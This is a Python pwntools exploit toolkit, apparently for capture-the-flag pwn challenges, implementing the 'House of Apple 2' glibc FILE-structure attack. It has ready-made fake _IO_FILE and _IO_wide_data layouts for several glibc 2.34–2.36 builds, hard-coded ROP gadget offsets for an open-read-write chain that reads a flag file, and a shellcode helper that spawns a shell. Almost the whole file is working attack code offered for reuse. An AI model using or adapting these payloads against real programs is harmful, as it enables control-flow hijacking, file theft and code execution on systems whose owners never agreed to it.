from pwn import *
from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8

def getProcess(ip,port,name):
    global p
    if len(sys.argv) > 1 and sys.argv[1] == 'r':
        p = remote(ip, port)
        return p
    else:
        p = process(name)
        return p

sl = lambda x: p.sendline(x)
sd = lambda x: p.send(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda x: p.recv(x)
rl = lambda: p.recvline()
ru = lambda x: p.recvuntil(x)
ita = lambda: p.interactive()
slc = lambda: asm(shellcraft.sh())
uu64 = lambda x: u64(x.ljust(8, b'\0'))
uu32 = lambda x: u32(x.ljust(4, b'\0'))

def gdbbug():
    gdb.attach(p)
    pause()

'''
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;	/* Current read pointer */
  wchar_t *_IO_read_end;	/* End of get area. */
  wchar_t *_IO_read_base;	/* Start of putback+get area. */
  wchar_t *_IO_write_base;	/* Start of put area. */
  wchar_t *_IO_write_ptr;	/* Current put pointer. */
  wchar_t *_IO_write_end;	/* End of put area. */
  wchar_t *_IO_buf_base;	/* Start of reserve area. */
  wchar_t *_IO_buf_end;		/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;	/* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base;	/* Pointer to first valid character of backup area */
  wchar_t *_IO_save_end;	/* Pointer to end of non-current get area. */
  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;
  wchar_t _shortbuf[1];
  const struct _IO_jump_t *_wide_vtable;
};
'''


class IO_FILE_plus_struct(FileStructure):

    def __init__(self, null=0):
        FileStructure.__init__(self, null)

    def __setattr__(self, item, value):
        if item in IO_FILE_plus_struct.__dict__ or item in FileStructure.__dict__ or item in self.vars_:
            object.__setattr__(self, item, value)
        else:
            error("Unknown variable %r" % item)

    def __getattr__(self, item):
        if item in IO_FILE_plus_struct.__dict__ or item in FileStructure.__dict__ or item in self.vars_:
            return object.__getattribute__(self, item)
        error("Unknown variable %r" % item)

    def __str__(self):
        return str(self.__bytes__())[2:-1]

    @property
    def _mode(self) -> int:
        off = 96
        if context.bits == 64:
            off = 192
        return (self.unknown2 >> off) & 0xffffffff

    @_mode.setter
    def _mode(self, value: int):
        assert value <= 0xffffffff and value >= 0, "value error: {}".format(hex(value))
        off = 96
        if context.bits == 64:
            off = 192
        self.unknown2 |= (value << off)

    @staticmethod
    def show_struct(arch="amd64"):
        if arch not in ("amd64", "i386"):
            error("arch error, noly i386 and amd64 supported!")
        print("arch :", arch)
        _IO_FILE_plus_struct_map = {
            'i386': {
                0x0: '_flags',
                0x4: '_IO_read_ptr',
                0x8: '_IO_read_end',
                0xc: '_IO_read_base',
                0x10: '_IO_write_base',
                0x14: '_IO_write_ptr',
                0x18: '_IO_write_end',
                0x1c: '_IO_buf_base',
                0x20: '_IO_buf_end',
                0x24: '_IO_save_base',
                0x28: '_IO_backup_base',
                0x2c: '_IO_save_end',
                0x30: '_markers',
                0x34: '_chain',
                0x38: '_fileno',
                0x3c: '_flags2',
                0x40: '_old_offset',
                0x44: '_cur_column',
                0x46: '_vtable_offset',
                0x47: '_shortbuf',
                0x48: '_lock',
                0x4c: '_offset',
                0x54: '_codecvt',
                0x58: '_wide_data',
                0x5c: '_freeres_list',
                0x60: '_freeres_buf',
                0x64: '__pad5',
                0x68: '_mode',
                0x6c: '_unused2',
                0x94: 'vtable'
            },
            'amd64': {
                0x0: '_flags',
                0x8: '_IO_read_ptr',
                0x10: '_IO_read_end',
                0x18: '_IO_read_base',
                0x20: '_IO_write_base',
                0x28: '_IO_write_ptr',
                0x30: '_IO_write_end',
                0x38: '_IO_buf_base',
                0x40: '_IO_buf_end',
                0x48: '_IO_save_base',
                0x50: '_IO_backup_base',
                0x58: '_IO_save_end',
                0x60: '_markers',
                0x68: '_chain',
                0x70: '_fileno',
                0x74: '_flags2',
                0x78: '_old_offset',
                0x80: '_cur_column',
                0x82: '_vtable_offset',
                0x83: '_shortbuf',
                0x88: '_lock',
                0x90: '_offset',
                0x98: '_codecvt',
                0xa0: '_wide_data',
                0xa8: '_freeres_list',
                0xb0: '_freeres_buf',
                0xb8: '__pad5',
                0xc0: '_mode',
                0xc4: '_unused2',
                0xd8: 'vtable'
            }
        }
        for k, v in _IO_FILE_plus_struct_map[arch].items():
            print("  {} : {} ".format(hex(k), v))

def apple2(mode,libc_table,libc,libc_base,heap_addr,flag_addr):
    if mode == 0:
        if libc_table == '2.35-3.8':
            fake_IO_FILE = flat({
                0x0: 0,                          # _IO_read_end      这几个不能用于赋值
                0x8: 0,                          # _IO_read_base     这几个不能用于赋值
                0x10: 0,                         # _IO_write_base   这几个不能用于赋值
                0x18: 0,                         # _IO_write_ptr    这几个不能用于赋值
                0x20: libc_base+0x2a3e5,         # _IO_write_end    <<<----fake_IO_wide_data的起始  0x0_IO_read_ptr
                0x28: flag_addr,                 # _IO_buf_base                                    0x8:_IO_read_end
                0x30: libc_base+0x2be51,         # _IO_buf_end                                     0x10:_IO_read_base
                0x38: 0,                         # _IO_save_base                                   0x18:_IO_write_base    <<-- 0
                0x40: libc_base+0x108b03,        # _IO_backup_base                                 0x20:_IO_write_ptr
                0x48: 0,                         # _IO_save_end                                    0x28:_IO_write_end
                0x50: 0,                         # _markers                                        0x30:_IO_buf_base      <<-- 0
                0x58: 0,                         # _chain                                          0x38:_IO_buf_end
                0x60: libc_base+0x45eb0,         # _fileno                                         0x40:_IO_save_base
                0x68: 2,                         # _old_offset                                     0x48:_IO_backup_base
                0x70: libc_base+0x11e88b,        # _cur_column                                     0x50:_IO_save_end
                0x78: libc_base+0x2a3e5,         # _lock                                           0x58:_IO_state
                0x80: 3,                         # _offset                                         0x60:
                0x88: libc_base+0x2be51,         # _codecvt                                        0x68
                0x90: heap_addr+0x20,            # _wide_data                                      0x70:
                0x98: libc_base+0x11f2e7,        # _freeres_list                                   0x78
                0xa0: 0x100,                     # _freeres_buf                                    0x80
                0xa8: 0,                         # __pad5                                          0x88
                0xb0: libc_base+0x1147d0,        # _mode                                           0x90
                0xb8: libc_base+0x11f2e7,        #                                                 0x98
                0xc0: 0x100,                     #                                                 0xa0
                0xc8:0x2170c0+libc_base,         # vtable                                          0xa8
                0xd0:libc_base+0x2a3e5,          #                                                 0xb0
                0xd8:1,                          #                                                 0xb8
                0xe0:libc_base+0x114870,         #                                                 0xc0
                0xe8:0,                          #                                                 0xc8
                0xf0:0,                          #                                                 0xd0
                0xf8:libc_base+0x5a120,          #                                                 0xd8
                0x100:heap_addr+0x90,            #                                                 0xe0:_wide_vtable
            })
            return fake_IO_FILE
        if libc_table == '2.35-3':
            fake_IO_FILE = flat({
                0x0: 0,                                     # _IO_read_end      这几个不能用于赋值
                0x8: 0,                                     # _IO_read_base     这几个不能用于赋值
                0x10: 0,                                    # _IO_write_base   这几个不能用于赋值
                0x18: 0,                                    # _IO_write_ptr    这几个不能用于赋值
                0x20: libc_base + 0x2a3e5,                  # _IO_write_end    <<<----fake_IO_wide_data的起始  0x0_IO_read_ptr
                0x28: flag_addr,                            # _IO_buf_base                                    0x8:_IO_read_end
                0x30: libc_base + 0x2be51,                  # _IO_buf_end                                     0x10:_IO_read_base
                0x38: 0,                                    # _IO_save_base                                   0x18:_IO_write_base    <<-- 0
                0x40: libc_base + 0x108b13,                 # _IO_backup_base                                 0x20:_IO_write_ptr
                0x48: 0,                                    # _IO_save_end                                    0x28:_IO_write_end
                0x50: 0,                                    # _markers                                        0x30:_IO_buf_base      <<-- 0
                0x58: 0,                                    # _chain                                          0x38:_IO_buf_end
                0x60: libc_base + 0x45eb0,                  # _fileno                                         0x40:_IO_save_base
                0x68: 2,                                    # _old_offset                                     0x48:_IO_backup_base
                0x70: libc_base+libc.sym["syscall"]+27,     # _cur_column                                     0x50:_IO_save_end
                0x78: libc_base + 0x2a3e5,                  # _lock                                           0x58:_IO_state
                0x80: 3,                                    # _offset                                         0x60:
                0x88: libc_base + 0x2be51,                  # _codecvt                                        0x68
                0x90: heap_addr + 0x20,                     # _wide_data                                      0x70:
                0x98: libc_base + 0x11f497,                 # _freeres_list                                   0x78
                0xa0: 0x100,                                # _freeres_buf                                    0x80
                0xa8: 0,                                    # __pad5                                          0x88
                0xb0: libc_base+libc.sym["read"],           # _mode                                           0x90
                0xb8: libc_base + 0x11f497,                 # 0x98
                0xc0: 0x100,                                # 0xa0
                0xc8: 0x2170c0 + libc_base,                 # vtable                                          0xa8
                0xd0: libc_base + 0x2a3e5,                  # 0xb0
                0xd8: 1,                                    # 0xb8
                0xe0: libc_base+libc.sym["write"],          # 0xc0
                0xe8: 0,                                    # 0xc8
                0xf0: 0,                                    # 0xd0
                0xf8: libc_base + 0x5a170,                  # 0xd8
                0x100: heap_addr + 0x90,                    # 0xe0:_wide_vtable
            })
            return fake_IO_FILE
        if libc_table == '2.36-0.4':
            pop_rdi = libc_base + 0x0000000000023b65
            pop_rdx = libc_base + 0x0000000000166262
            pop_rsi = libc_base + 0x00000000000251be
            pop_rax = libc_base + 0x000000000003fa43
            pop_rdx_rbx=libc_base + 0x8bcd9
            fake_IO_FILE = flat({
                0x0: 0,                                     # _IO_read_end      这几个不能用于赋值
                0x8: 0,                                     # _IO_read_base     这几个不能用于赋值
                0x10: 0,                                    # _IO_write_base   这几个不能用于赋值
                0x18: 0,                                    # _IO_write_ptr    这几个不能用于赋值
                0x20: pop_rdi,                              # _IO_write_end    <<<----fake_IO_wide_data的起始  0x0_IO_read_ptr
                0x28: flag_addr,                            # _IO_buf_base                                    0x8:_IO_read_end
                0x30: pop_rdx_rbx,                              # _IO_buf_end                                     0x10:_IO_read_base
                0x38: 0,                                    # _IO_save_base                                   0x18:_IO_write_base    <<-- 0
                0x40: libc_base+0x54990,                          # _IO_backup_base                                 0x20:_IO_write_ptr
                0x48: pop_rsi,                                    # _IO_save_end                                    0x28:_IO_write_end
                0x50: 0,                                    # _markers                                        0x30:_IO_buf_base      <<-- 0
                0x58: pop_rax,                              # _chain                                          0x38:_IO_buf_end
                0x60: 2,                                    # _fileno                                         0x40:_IO_save_base
                0x68: libc_base+libc.sym["syscall"]+27,     # _old_offset                                     0x48:_IO_backup_base
                0x70: pop_rdi,                              # _cur_column                                     0x50:_IO_save_end
                0x78: 3,                                    # _lock                                           0x58:_IO_state
                0x80: pop_rdx_rbx,                          # _offset                                         0x60:
                0x88: 0x100,                                # _codecvt                                        0x68
                0x90: heap_addr+0x20,                       # _wide_data                                      0x70:
                0x98: libc_base+libc.sym["read"],           # _freeres_list                                   0x78
                0xa0: pop_rdi,                              # _freeres_buf                                    0x80
                0xa8: 1,                                    # __pad5                                          0x88
                0xb0: libc_base+libc.sym["write"],         # _mode                                           0x90
                0xb8: heap_addr+0x20,                       #                                                 0x98
                0xc0: 0,                                    #                                                 0xa0
                0xc8: libc.sym._IO_wfile_jumps + libc_base, # vtable                                          0xa8
                0xd0: 0,                                    #                                                 0xb0
                0xd8: 0,                                    #                                                 0xb8
                0xe0: 0,                                    #                                                 0xc0
                0xe8: libc_base+0x160e56,                   #                                                 0xc8
                0xf0: 0,                                    #                                                 0xd0
                0xf8: 0,                                    #                                                 0xd8
                0x100: heap_addr + 0x80,                    #                                                 0xe0:_wide_vtable
            })
            return fake_IO_FILE

        if libc_table == '2.34-0.3.2':
            pop_rdi = libc_base + 0x000000000002a6c5
            pop_rdx = libc_base + 0x000000000005f65a
            pop_rsi = libc_base + 0x000000000002c081
            pop_rax = libc_base + 0x0000000000045f10
            pop_rdx_rcx_rbx=libc_base + 0x0000000000107da3
            pop_rdx_r12=libc_base + 0x000000000011e491

            fake_IO_FILE = flat({
                0x0: 0,                                             # _IO_read_end      这几个不能用于赋值
                0x8: 0,                                             # _IO_read_base     这几个不能用于赋值
                0x10: 0,                                            # _IO_write_base   这几个不能用于赋值
                0x18: 0,                                            # _IO_write_ptr    这几个不能用于赋值
                0x20: pop_rdi,                                      # _IO_write_end    <<<----fake_IO_wide_data的起始  0x0_IO_read_ptr
                0x28: flag_addr,                                    # _IO_buf_base                                    0x8:_IO_read_end
                0x30: pop_rsi,                                      # _IO_buf_end                                     0x10:_IO_read_base
                0x38: 0,                                            # _IO_save_base                                   0x18:_IO_write_base    <<-- 0
                0x40: pop_rdx_rcx_rbx,                              # _IO_backup_base                                 0x20:_IO_write_ptr
                0x48: 0,                                            # _IO_save_end                                    0x28:_IO_write_end
                0x50: 0,                                            # _markers                                        0x30:_IO_buf_base      <<-- 0
                0x58: 0,                                            # _chain                                          0x38:_IO_buf_end
                0x60: pop_rax,                                      # _fileno                                         0x40:_IO_save_base
                0x68: 2,                                            # _old_offset                                     0x48:_IO_backup_base
                0x70: libc_base+libc.sym["syscall"]+27,             # _cur_column                                     0x50:_IO_save_end
                0x78: pop_rdi,                                      # _lock                                           0x58:_IO_state
                0x80: 3,                                            # _offset                                         0x60:
                0x88: pop_rsi,                                      # _codecvt                                        0x68
                0x90: heap_addr + 0x20,                             # _wide_data                                      0x70:
                0x98: pop_rdx_r12,                                  # _freeres_list                                   0x78
                0xa0: 0x100,                                        # _freeres_buf                                    0x80
                0xa8: 0,                                            # __pad5                                          0x88
                0xb0: libc_base+libc.sym["read"],                   # _mode                                           0x90
                0xb8: pop_rdx_r12,                                  #                                                 0x98
                0xc0: 0x100,                                        #                                                 0xa0
                0xc8: libc.sym._IO_wfile_jumps + libc_base,         # vtable                                          0xa8
                0xd0: pop_rdi,                                      #                                                 0xb0
                0xd8: 1,                                            #                                                 0xb8
                0xe0: libc_base+libc.sym["write"],                  #                                                 0xc0
                0xe8: 0,                                            #                                                 0xc8
                0xf0: 0,                                            #                                                 0xd0
                0xf8: libc_base + 0x59fa0,                          #                                                 0xd8
                0x100: heap_addr + 0x90,                            #                                                 0xe0:_wide_vtable
            })
            return fake_IO_FILE

        if libc_table == '2.34-0.3':
            pop_rdi = libc_base + 0x000000000002e6c5
            pop_rdx = libc_base + 0x0000000000120272
            pop_rsi = libc_base + 0x0000000000030081
            pop_rax = libc_base + 0x0000000000049f10
            pop_rdx_rcx_rbx = libc_base + 0x000000000010bd83
            pop_rdx_r12 = libc_base + 0x0000000000122431

            fake_IO_FILE = flat({
                0x0: 0,  # _IO_read_end      这几个不能用于赋值
                0x8: 0,  # _IO_read_base     这几个不能用于赋值
                0x10: 0,  # _IO_write_base   这几个不能用于赋值
                0x18: 0,  # _IO_write_ptr    这几个不能用于赋值
                0x20: pop_rdi,  # _IO_write_end    <<<----fake_IO_wide_data的起始  0x0_IO_read_ptr
                0x28: flag_addr,  # _IO_buf_base                                    0x8:_IO_read_end
                0x30: pop_rsi,  # _IO_buf_end                                     0x10:_IO_read_base
                0x38: 0,  # _IO_save_base                                   0x18:_IO_write_base    <<-- 0
                0x40: pop_rdx_rcx_rbx,  # _IO_backup_base                                 0x20:_IO_write_ptr
                0x48: 0,  # _IO_save_end                                    0x28:_IO_write_end
                0x50: 0,  # _markers                                        0x30:_IO_buf_base      <<-- 0
                0x58: 0,  # _chain                                          0x38:_IO_buf_end
                0x60: pop_rax,  # _fileno                                         0x40:_IO_save_base
                0x68: 2,  # _old_offset                                     0x48:_IO_backup_base
                0x70: libc_base + libc.sym["syscall"] + 27,
                # _cur_column                                     0x50:_IO_save_end
                0x78: pop_rdi,  # _lock                                           0x58:_IO_state
                0x80: 3,  # _offset                                         0x60:
                0x88: pop_rsi,  # _codecvt                                        0x68
                0x90: heap_addr + 0x20,  # _wide_data                                      0x70:
                0x98: pop_rdx_r12,  # _freeres_list                                   0x78
                0xa0: 0x100,  # _freeres_buf                                    0x80
                0xa8: 0,  # __pad5                                          0x88
                0xb0: libc_base + libc.sym["read"],  # _mode                                           0x90
                0xb8: pop_rdx_r12,  # 0x98
                0xc0: 0x100,  # 0xa0
                0xc8: libc.sym._IO_wfile_jumps + libc_base,  # vtable                                          0xa8
                0xd0: pop_rdi,  # 0xb0
                0xd8: 1,  # 0xb8
                0xe0: libc_base + libc.sym["write"],  # 0xc0
                0xe8: 0,  # 0xc8
                0xf0: 0,  # 0xd0
                0xf8: libc_base + 0x5df80,  # mov rsp,rdx;ret 0xd8
                0x100: heap_addr + 0x90,  # 0xe0:_wide_vtable
            })
            return fake_IO_FILE







